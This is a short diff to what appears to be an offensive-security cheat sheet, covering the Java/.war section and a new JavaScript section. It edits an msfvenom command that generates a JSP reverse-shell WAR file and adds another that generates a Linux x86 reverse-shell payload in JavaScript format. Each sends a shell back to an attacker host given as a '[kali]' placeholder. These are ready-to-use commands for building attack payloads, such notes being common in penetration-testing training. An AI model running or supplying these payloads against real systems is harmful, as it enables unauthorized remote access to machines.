@@ -654,7 +654,12 @@ $ python pyinstaller.py --onefile <pythonscript>
 
 Java / .war
 ```
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f war -o rshell.war
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[kali] LPORT=9999 -f war -o rshell.war
+```
+
+Javascript
+```
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=[kali] LPORT=443 -f js_le -e generic/none
 ```
 
 
